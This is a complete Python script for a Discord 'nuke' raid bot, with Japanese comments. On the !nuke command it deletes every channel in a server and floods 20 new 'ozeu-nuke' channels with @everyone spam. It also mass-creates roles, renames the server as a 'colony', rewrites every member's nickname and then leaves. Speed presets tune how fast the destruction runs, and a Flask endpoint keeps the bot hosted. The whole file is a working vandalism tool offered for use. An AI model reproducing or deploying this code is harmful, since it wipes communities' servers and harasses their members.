# ================= CONFIG =================
import os
import asyncio
import logging
from datetime import datetime
from typing import List
import threading
import discord
from discord.ext import commands
from flask import Flask, jsonify

# ------------------- ユーザー設定 -------------------
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.guilds = True
INTENTS.messages = True
INTENTS.message_content = True
INTENTS.members = True

# --- メイン作業 ---
ROLE_BASE      = "ozeumember"
ROLE_COUNT     = 20
CHANNEL_BASE   = "ozeu-nuke"
CHANNEL_COUNT  = 20
REPEAT_MESSAGE = "@everyone Hello, Raid!"
REPEAT_COUNT   = 1

# --- サブ作業 ---
CHANGE_NICKNAMES = True
NICK_BASE        = "おぜう様万歳！"
NEW_GUILD_NAME   = "おぜう植民地"

# --- 速度プリセット ---
# 遅い / 普通 / 速い / 爆速
SPEED_LEVEL = "速い"

SPEED_PRESETS = {
    "遅い": {
        "DELETE_CHUNK_SIZE": 3, "DELETE_CHUNK_SLEEP": 0.2, "POST_DELETE_WAIT": 4.0,
        "CREATE_CHUNK_SIZE": 2, "CREATE_CHUNK_SLEEP": 0.3,
        "MSG_CHUNK_SIZE": 3, "MSG_INTER_CHUNK_SLEEP": 0.05, "MSG_INTER_ROUND_SLEEP": 0.1,
        "ROLE_CHUNK_SIZE": 2, "ROLE_SLEEP": 0.1,
        "NICK_CHUNK_SIZE": 6, "NICK_CHUNK_SLEEP": 0.25
    },
    "普通": {
        "DELETE_CHUNK_SIZE": 5, "DELETE_CHUNK_SLEEP": 0.1, "POST_DELETE_WAIT": 3.0,
        "CREATE_CHUNK_SIZE": 4, "CREATE_CHUNK_SLEEP": 0.2,
        "MSG_CHUNK_SIZE": 6, "MSG_INTER_CHUNK_SLEEP": 0.02, "MSG_INTER_ROUND_SLEEP": 0.05,
        "ROLE_CHUNK_SIZE": 4, "ROLE_SLEEP": 0.05,
        "NICK_CHUNK_SIZE": 8, "NICK_CHUNK_SLEEP": 0.15
    },
    "速い": {
        "DELETE_CHUNK_SIZE": 8, "DELETE_CHUNK_SLEEP": 0.08, "POST_DELETE_WAIT": 2.0,
        "CREATE_CHUNK_SIZE": 6, "CREATE_CHUNK_SLEEP": 0.12,
        "MSG_CHUNK_SIZE": 10, "MSG_INTER_CHUNK_SLEEP": 0.01, "MSG_INTER_ROUND_SLEEP": 0.02,
        "ROLE_CHUNK_SIZE": 6, "ROLE_SLEEP": 0.03,
        "NICK_CHUNK_SIZE": 12, "NICK_CHUNK_SLEEP": 0.12
    },
    "爆速": {
        "DELETE_CHUNK_SIZE": 12, "DELETE_CHUNK_SLEEP": 0.04, "POST_DELETE_WAIT": 1.0,
        "CREATE_CHUNK_SIZE": 10, "CREATE_CHUNK_SLEEP": 0.05,
        "MSG_CHUNK_SIZE": 20, "MSG_INTER_CHUNK_SLEEP": 0.005, "MSG_INTER_ROUND_SLEEP": 0.01,
        "ROLE_CHUNK_SIZE": 12, "ROLE_SLEEP": 0.01,
        "NICK_CHUNK_SIZE": 16, "NICK_CHUNK_SLEEP": 0.05
    }
}

# プリセット反映
preset = SPEED_PRESETS.get(SPEED_LEVEL, SPEED_PRESETS["普通"])
DELETE_CHUNK_SIZE      = preset["DELETE_CHUNK_SIZE"]
DELETE_CHUNK_SLEEP     = preset["DELETE_CHUNK_SLEEP"]
POST_DELETE_WAIT       = preset["POST_DELETE_WAIT"]
CREATE_CHUNK_SIZE      = preset["CREATE_CHUNK_SIZE"]
CREATE_CHUNK_SLEEP     = preset["CREATE_CHUNK_SLEEP"]
MSG_CHUNK_SIZE         = preset["MSG_CHUNK_SIZE"]
MSG_INTER_CHUNK_SLEEP  = preset["MSG_INTER_CHUNK_SLEEP"]
MSG_INTER_ROUND_SLEEP  = preset["MSG_INTER_ROUND_SLEEP"]
ROLE_CHUNK_SIZE        = preset["ROLE_CHUNK_SIZE"]
ROLE_SLEEP             = preset["ROLE_SLEEP"]
NICK_CHUNK_SIZE        = preset["NICK_CHUNK_SIZE"]
NICK_CHUNK_SLEEP       = preset["NICK_CHUNK_SLEEP"]

# ------------------- ログ & Bot -------------------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("fast-nuke")
bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
app = Flask(__name__)

@app.route("/", methods=["GET"])
def health():
    return {"status": "ok", "bot_ready": bot.is_ready(), "bot_user": str(bot.user) if bot.user else None}

def start_flask():
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# ==================== Helpers ====================
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i+n]

async def safe_delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
        logger.info(f"Deleted: {channel.name} ({channel.id})")
    except Exception as e:
        logger.warning(f"Delete failed {channel}: {e}")

async def safe_create_channel(guild: discord.Guild, name: str):
    try:
        ch = await guild.create_text_channel(name)
        logger.info(f"Created channel: {name} ({ch.id})")
        await asyncio.sleep(0.1)
        return ch
    except Exception as e:
        logger.warning(f"Create failed {name}: {e}")
        return None

async def safe_create_role(guild: discord.Guild, name: str):
    try:
        r = await guild.create_role(name=name, permissions=discord.Permissions.none())
        logger.info(f"Created role: {name} ({r.id})")
        return r
    except Exception as e:
        logger.warning(f"Role creation failed {name}: {e}")
        return None

async def safe_send(ch: discord.TextChannel, content: str):
    try:
        await ch.send(content[:2000])
    except Exception as e:
        logger.warning(f"Send failed {ch}: {e}")

async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
    for _ in range(repeat):
        for i in range(0, len(channels), MSG_CHUNK_SIZE):
            chunk = channels[i:i+MSG_CHUNK_SIZE]
            await asyncio.gather(*(safe_send(c, msg) for c in chunk))
            await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
        await asyncio.sleep(MSG_INTER_ROUND_SLEEP)

async def safe_change_nick(member: discord.Member, new_nick: str):
    try:
        await member.edit(nick=new_nick)
        return True
    except Exception:
        return False

async def change_all_nicknames(guild: discord.Guild):
    if not CHANGE_NICKNAMES:
        return 0
    members = [m for m in guild.members if not m.bot]
    changed = 0
    tasks = [(m, f"{NICK_BASE}-{i+1}") for i, m in enumerate(members)]
    for group in chunk_list(tasks, NICK_CHUNK_SIZE):
        coros = [safe_change_nick(m, nick) for m, nick in group]
        results = await asyncio.gather(*coros)
        changed += sum(1 for r in results if r)
        await asyncio.sleep(NICK_CHUNK_SLEEP)
    return changed

def bot_has_permissions(guild: discord.Guild):
    me = guild.me
    if me is None:
        return False
    perms = me.guild_permissions
    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames

# ==================== Command ====================
@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    if not bot_has_permissions(guild):
        await ctx.send("Botに必要な権限がありません")
        return

    # バックアップチャンネル作成
    backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
    backup_channel = await guild.create_text_channel(backup_name)
    await backup_channel.send("⚙️ nuke開始")

    # --- メイン作業 ---
    async def main_tasks():
        # チャンネル削除
        channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
        for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
            await asyncio.gather(*(safe_delete_channel(c) for c in group))
            await asyncio.sleep(DELETE_CHUNK_SLEEP)
        await asyncio.sleep(POST_DELETE_WAIT)

        # チャンネル作成
        created_channels = []
        names = [f"{CHANNEL_BASE}-{i+1}" for i in range(CHANNEL_COUNT)]
        for group in chunk_list(names, CREATE_CHUNK_SIZE):
            results = await asyncio.gather(*(safe_create_channel(guild, n) for n in group))
            created_channels.extend([c for c in results if c])
            await asyncio.sleep(CREATE_CHUNK_SLEEP)

        # メッセージ送信
        await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)

    # --- サブ作業 ---
    async def sub_tasks():
        # サーバ名変更
        if NEW_GUILD_NAME:
            try:
                await guild.edit(name=NEW_GUILD_NAME)
            except Exception as e:
                logger.warning(f"Guild rename failed: {e}")

        # ロール作成 (安全な並列)
        role_names = [f"{ROLE_BASE}-{i}" for i in range(1, ROLE_COUNT+1)]
        for group in chunk_list(role_names, ROLE_CHUNK_SIZE):
            await asyncio.gather(*(safe_create_role(guild, name) for name in group))
            await asyncio.sleep(ROLE_SLEEP)

        # ニックネーム変更
        await change_all_nicknames(guild)

    # 並列実行
    await asyncio.gather(main_tasks(), sub_tasks())

    await backup_channel.send("✅ nuke完了。Botはサーバーを退出します")
    await asyncio.sleep(1.0)
    try:
        await guild.leave()
    except Exception as e:
        logger.warning(f"Guild leave failed: {e}")

# ==================== Entrypoint ====================
if __name__ == "__main__":
    threading.Thread(target=start_flask, daemon=True).start()
    if not TOKEN:
        raise SystemExit("DISCORD_TOKENが必要です")
    bot.run(TOKEN)
